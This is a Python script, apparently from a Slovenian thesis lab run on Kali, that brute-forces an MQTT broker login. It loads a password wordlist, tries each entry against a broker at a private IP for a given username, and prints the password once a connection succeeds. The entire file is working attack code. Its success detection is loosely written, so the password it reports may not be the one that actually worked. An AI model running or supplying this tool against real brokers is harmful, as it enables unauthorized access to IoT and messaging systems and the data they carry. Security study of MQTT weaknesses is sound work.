import paho.mqtt.client as mqtt
import sys
import os

# program lahko sprejema 4 argumente: IP naslov posrednika, vrata posrednika, uporabniško ime ter pot do "slovarja" (seznama gesel)
# na primer: "python3.9 bruteforce.py uporabnik1 192.168.22.61 1883 /home/kali/diplomska/seznam.txt"
# če vrednosti niso podane uporabi privzete vrednosti definirane spodaj

broker = "192.168.22.61" #
port = 1883
Keep_Alive_Interval = 45
username = "uporabnik1"
wordlist_path = "/home/kali/diplomska/seznam.txt"

def read_args():
    global username, broker, port, wordlist_path
    username = str((sys.argv[1]))
    if (len(sys.argv)>2):
    	broker = str((sys.argv[2]))
    if (len(sys.argv)>3):
    	port = str((sys.argv[3]))
    if (len(sys.argv)>4):
    	wordlist_path = str((sys.argv[4]))

if len(sys.argv) > 1:
	read_args()

def on_connect(mosq, obj, rc):
	client.subscribe("/avtomobili/uporabnik1/",0)
	if(rc==0):
		print("Geslo je: " + password)
		os._exit(0)
			

attempts = 0
doc_len = len(open(wordlist_path, "r", errors='replace').readlines())
lines = []
password =""

with open(wordlist_path, "r", errors='replace') as f:
	for _ in range(doc_len):
		lines.append(f.readline())


for i in range(doc_len):
	attempts += 1
	line = lines[i]
	possible_password= line.rstrip('\n')	
	print(str(attempts) +" " + possible_password)
	
	try:
		#print(broker, port, username, wordlist_path)		
		client = mqtt.Client()
		client.on_connect = on_connect
		client.username_pw_set(username, possible_password)
		client.connect(broker, int(port), int(Keep_Alive_Interval))
		client.loop_start()
		password = possible_password
	except:
		pass